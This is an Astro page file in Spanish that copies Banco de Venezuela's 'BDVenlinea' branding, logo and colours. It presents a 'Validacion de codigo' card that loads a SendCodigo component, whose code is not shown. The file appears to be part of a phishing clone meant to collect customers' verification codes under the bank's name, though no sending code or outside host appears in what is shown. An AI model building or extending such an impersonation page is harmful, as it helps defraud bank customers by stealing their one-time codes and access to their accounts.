---
import LayoutCodigo from "../layouts/LayoutCodigo.astro";
import { Image } from "astro:assets";
import BDV from "../images/BDV-logo.png";
import SendCodigo from "@components/SendCodigo";
import RoundedInput from "@components/RoundedInput";
---

<LayoutCodigo
  title="BDVenlinea Credito"
  description="Pagina principal de creditos del Banco de Venezuela"
>
  <main class="m-4 md:m-0 relative z-0 bg-[#ededed]">
    <h1
      class="z-20 relative pt-8 text-center text-3xl font-bold text-[#0067b1]"
    >
      Validacion de codigo BDVenlinea
    </h1>

    <!-- Contenido principal -->
    <div
      class="grid grid-cols-1 items-center p-8 m-4 bg-white max-w-[398px] mx-auto shadow-black/10 shadow-lg rounded-md relative z-10 md:ml-0 md:left-32 md:top-20"
    >
      <Image
        class="max-w-44 mx-auto"
        src={BDV}
        alt="Logo del banco nacional de venezuela"
      />
      <SendCodigo client:load />
    </div>
  </main>
</LayoutCodigo>
